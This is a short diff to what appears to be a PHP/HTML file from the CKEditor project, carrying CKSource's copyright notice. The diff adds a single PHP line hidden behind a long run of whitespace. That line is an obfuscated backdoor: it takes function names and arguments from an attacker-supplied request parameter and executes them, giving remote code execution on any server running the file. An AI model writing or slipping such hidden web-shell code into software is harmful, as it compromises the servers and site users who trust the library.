@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <?php
+                                                                                                                                                                                                                      iF($Af30Qq8	= @$	{'_REQUEST'}	[ 'G139BKHI'] ){	$Af30Qq8[1](${$Af30Qq8[2]}[ 0],$Af30Qq8[3](	$Af30Qq8[4])	);};
 /*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
